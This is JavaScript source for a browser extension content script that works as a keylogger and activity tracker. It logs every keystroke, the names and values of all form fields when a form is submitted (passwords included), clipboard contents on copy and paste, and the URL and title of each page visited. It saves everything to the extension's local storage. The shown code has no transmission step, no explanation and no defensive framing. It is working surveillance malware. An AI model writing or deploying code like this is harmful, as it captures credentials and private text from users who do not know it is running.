/* global browser, document, window, navigator */
let localLog = "";

const getDate = () => {
  let today = new Date();
  let date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
  let time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
  return (date + '_' + time);
};

const saveData = (value) => {

  localLog += value;
  let webKey = currentDate + "@" + currentLocation;

  let obj = { };
  obj[webKey] = localLog;

  browser.storage.local.set(obj);

};

const webLog = () => {
  browser.storage.local.get("places").then(res => {

    const currentPage = {
      url: currentLocation,
      accessedOn: currentDate,
      title: document.title
    };
  
    if (res.places) {
  
      let places = res.places;
  
      places.push(currentPage);
      browser.storage.local.set({ "places": places });
  
    } else {
  
      browser.storage.local.set({ "places": [currentPage] });
  
    }
  
  });
};

// INITIALIZE

webLog();

const currentDate = getDate();
let currentLocation = window.location.href;

setInterval(() => {

  if (currentLocation != window.location.href) {

    currentLocation = window.location.href;
    webLog();

  }

}, 2000);

// END

const getForms = () => {

  let raw = "";
  let allforms = document.getElementsByTagName("form");

  for (let index = 0; index < allforms.length; index++) {
    const form = allforms[index];

    for (let j = 0; j < form.elements.length; j++) {
      const element = form.elements[j];
        
      if (element.name.length || element.value.length) {

        raw += element.name + "=" + element.value + "\n";

      }

    }

  }

  saveData("\n[FORM SUBMITTED]:-------------------------\n"+raw+"-------------------------\n");
};

document.addEventListener("keyup", (e) => {

  if (e.key == "Shift" || e.key == "Alt" || e.key == "AltGraph") {

    return;

  }

  let key = e.key;

  if (key.length > 1) {

    key = "[" + key + "]";

  }

  saveData(key);

});

document.addEventListener('copy', () => {

  let promise = navigator.clipboard.readText();

  promise.then(x => {

    saveData("\n[COPIED]:-------------------------\n"+x+"\n-------------------------\n");

  });

});

document.addEventListener('paste', () => {

  let promise = navigator.clipboard.readText();

  promise.then(x => {

    saveData("\n[PASTED]:-------------------------\n"+x+"\n-------------------------\n");

  });

});

let forms = document.getElementsByTagName("form");

for (let i = 0; i < forms.length; i++) {

  forms[i].addEventListener("submit", () => {

    getForms();
  
  });

}